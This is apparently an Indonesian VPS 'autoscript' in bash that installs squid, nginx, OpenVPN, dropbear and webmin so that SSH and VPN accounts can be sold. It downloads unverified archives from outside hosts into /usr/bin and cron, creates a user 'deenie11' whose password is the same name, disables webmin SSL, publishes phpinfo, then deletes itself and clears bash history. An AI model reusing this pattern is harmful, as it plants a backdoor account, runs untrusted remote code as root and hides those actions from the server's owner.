#!/bin/bash
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;

flag=0

echo


if [ $USER != 'root' ]; then
	echo "Sorry, for run the script please using root user"
	exit
fi
echo "
AUTOSCRIPT BY YUSUF ARDIANSYAH

PLEASE CANCEL ALL PACKAGE POPUP

TAKE NOTE !!!"
clear
echo "START AUTOSCRIPT"
clear
echo "SET TIMEZONE JAKARTA GMT +7"
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6

COMPLETE 1%
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear
echo "
REMOVE SPAM PACKAGE

COMPLETE 10%
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
UPDATE AND UPGRADE PROCESS 

PLEASE WAIT TAKE TIME 1-5 MINUTE
"
apt-get update;apt-get -y upgrade;apt-get -y install wget curl
echo "
INSTALLER PROCESS PLEASE WAIT
TAKE TIME 5-10 MINUTE
"
# login setting
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
# squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/conf/squid3.conf"
sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
# nginx
apt-get -y install nginx php5-fpm php5-cli
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/conf/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Setup by YusufArdiansyah | telegram : e-Server | Pin BBM : yu-suf</pre>" > /home/vps/public_html/index.php
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/conf/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget http://vpnpowerjack.com/debian8x64/source/openvpn.tar
tar xf openvpn.tar
rm openvpn.tar

# iptables.up.rules
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/conf/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules

# etc
wget -O /home/vps/public_html/client.ovpn "http://vpnpowerjack.com/debian8x64/source/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
# cronjob
cd
wget http://vpnpowerjack.com/debian8x64/source/cronjob.tar
tar xf cronjob.tar
mv uptimes.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/
mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol
chmod +x /usr/bin/userssh
chmod +x /usr/bin/uservpn
useradd -m -g users -s /bin/bash deenie11
echo "deenie11:deenie11" | chpasswd
#
# setting port ssh
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i 's/Port 22/Port  22/g' /etc/ssh/sshd_config
service ssh restart

# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 443"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
service ssh restart
service dropbear restart

# install fail2ban
apt-get -y install fail2ban
service fail2ban restart

# install webmin
cd
wget "http://prdownloads.sourceforge.net/webadmin/webmin_1.820_all.deb"
dpkg --install webmin_1.820_all.deb
apt-get -y -f install
rm /root/webmin_1.820_all.deb
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin restart
service vnstat restart
# usernew
#cd
#wget "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/menu/create-user.sh"
#cp /root/create-user.sh /usr/local/bin/usernew
#chmod +x /usr/local/bin/usernew
# User Status
cd
wget "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/menu/user-list"
mv ./user-list /usr/local/bin/user-list
chmod +x /usr/local/bin/user-list


# Install Monitor
cd
wget "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/menu/monssh"
mv monssh /usr/local/bin/
chmod +x /usr/local/bin/monssh

# speedtest
cd
apt-get install python
wget -O speedtest.py "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/menu/speedtest.py"
chmod +x speedtest.py

# Install Menu
cd
wget "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/menu/menu"
mv ./menu /usr/local/bin/menu
chmod +x /usr/local/bin/menu

# moth
cd
wget "https://raw.githubusercontent.com/deeniedoank/autoscript2/master/menu/motd"
mv ./motd /etc/motd


echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc
clear
service openvpn restart
service squid3 restart
service ssh restart
service webmin restart
service dropbear restart
service nginx start
clear
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript VPS Yusuf Ardiansyah"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "Webmin   : http://$myip:10000/"
echo "Squid3   : 8080"  | tee -a log-install.txt
echo "OpenSSH  : 22, 143"  | tee -a log-install.txt
echo "Dropbear : 443"  | tee -a log-install.txt
echo "OpenVPN  : TCP 1194 (client config : http://$myip/client.ovpn)"  | tee -a log-install.txt
echo "Timezone : Asia/Jakarta"  | tee -a log-install.txt
echo "Fail2Ban : [on]"   | tee -a log-install.txt
echo "Power By : Yusuf Ardiansyah"  | tee -a log-install.txt
echo "PIN BBM  : yu-suf "  | tee -a log-install.txt
echo "Telegram : e-Server"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "----------------------------------------"
echo "LOG INSTALL  --> /root/log-install.txt"
echo "----------------------------------------"
echo " CREATED BY YUSUF ARDIANSYAH - JUAL AKUN SSH - VPS - SCRIPT INSTALLER PREMIUM" | tee -a log-install.txt
echo "========================================"  | tee -a log-install.txt
echo "      SILAHKAN REBOOT VPS ANDA !"
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
